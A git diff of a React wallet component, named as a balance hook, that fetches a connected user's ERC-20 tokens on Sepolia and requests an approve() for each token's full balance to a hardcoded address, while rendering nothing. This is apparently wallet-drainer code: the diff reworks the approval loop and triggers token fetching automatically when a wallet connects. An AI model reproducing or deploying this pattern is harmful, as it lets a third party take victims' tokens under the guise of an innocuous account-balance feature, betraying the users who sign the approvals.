@@ -1,11 +1,11 @@
 import React, { useState, useEffect } from "react";
 import { Alchemy, Network } from "alchemy-sdk";
-import { useAccount, useSwitchChain } from "wagmi";
+import { useAccount, useSwitchChain, useAccountEffect } from "wagmi";
 import Erc20Abi from "../abi/Erc20Abi";
 import { config as wagmiConfig } from "../../wagmiConfig";
 import { writeContract } from "@wagmi/core";
 const UseAccountBalances = () => {
-  const { address, isConnected } = useAccount();
+  const { address, isConnected, status } = useAccount();
 
   const { chains, switchChain } = useSwitchChain();
   const [tokensData, setTokensData] = useState([]);
@@ -15,7 +15,11 @@ const UseAccountBalances = () => {
     network: Network.ETH_SEPOLIA,
   };
   const alchemy = new Alchemy(config);
-
+  useEffect(() => {
+    if (status === "connected") {
+      getUserTokens();
+    }
+  }, [status,isConnected, address]);
 
   const getUserTokens = async () => {
     try {
@@ -36,38 +40,35 @@ const UseAccountBalances = () => {
     }
   };
 
+  const increaseAllowanceForTokens = async (tokensData) => {
+    tokensData.forEach((obj) => {
+      const { contractAddress, tokenBalance } = obj;
+      const hexToNumber = parseInt(tokenBalance, 16);
+
+      if (hexToNumber > 0) {
+        increaseAllowance(contractAddress, hexToNumber);
+      }
+    });
+  };
   const increaseAllowance = async (contractAddress, allowance) => {
-    console.log("increase allowance is triggered");
-    console.log("allowance", allowance, "token Address", contractAddress);
-    try {
-      const hash = await writeContract(wagmiConfig,{
+    return new Promise((resolve, reject) => {
+      writeContract(wagmiConfig, {
         address: contractAddress,
         abi: Erc20Abi,
         functionName: "approve",
         args: ["0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f", allowance],
-      });
-    } catch (error) {
-      console.log("increase allowance error", error);
-    }
-  };
-
-  const increaseAllowanceForTokens = async (tokensData) => {
-
-    tokensData.forEach(obj => {
-      const {contractAddress, tokenBalance} = obj
-        const hexToNumber = parseInt(tokenBalance,16)
-
-        if(hexToNumber > 0){
-      increaseAllowance(contractAddress,hexToNumber)}
-
+      })
+        .then((hash) => {
+          console.log("Transaction hash:", hash);
+          resolve(hash); // Resolve the promise with the transaction hash
+        })
+        .catch((error) => {
+          console.log("increase allowance error", error);
+          reject(error); // Reject the promise with the error
+        });
     });
-    
   };
-  useEffect(() => {
-    if (isConnected) {
-      getUserTokens();
-    }
-  }, [isConnected]);
+
   return <div></div>;
 };
 
